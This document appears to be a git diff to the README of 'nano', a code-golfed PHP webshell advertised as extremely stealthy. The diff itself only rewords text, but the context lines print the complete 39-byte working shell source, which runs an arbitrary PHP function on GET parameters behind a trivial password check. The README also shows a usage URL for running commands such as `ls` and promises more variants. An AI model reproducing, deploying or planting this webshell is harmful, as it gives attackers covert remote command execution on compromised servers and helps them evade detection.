@@ -1,6 +1,6 @@
 # nano
 nano is a PHP webshell which is code golfed to be extremely stealthy.\
-Put it on watch maybe, I am planning to upload some variantions of it in near future.
+Put it on watch maybe, I am planning to upload some variantions of it really soon.
 
 ### Usage
 `http://example.com/nano.php?f=function&c=command&p=password`
@@ -20,12 +20,10 @@ For example, the code below will execute the `ls` command:
 - Fully flexible & efficient if you know stuff
 
 ## Functioning
-nano consists of 39 characters and hence is 39 bytes in size.\
-Source Code:
 ```php
 <?$x=$_GET;($x[p]=='_'?$x[f]($x[c]):y);
 ```
-Yeah I know that looks kind of puzzling but let me explaining it.
+Yep, that's the source code and I know that looks kind of puzzling but let me explain it.
 
 - `<?` a valid replacement for `<?php`
 
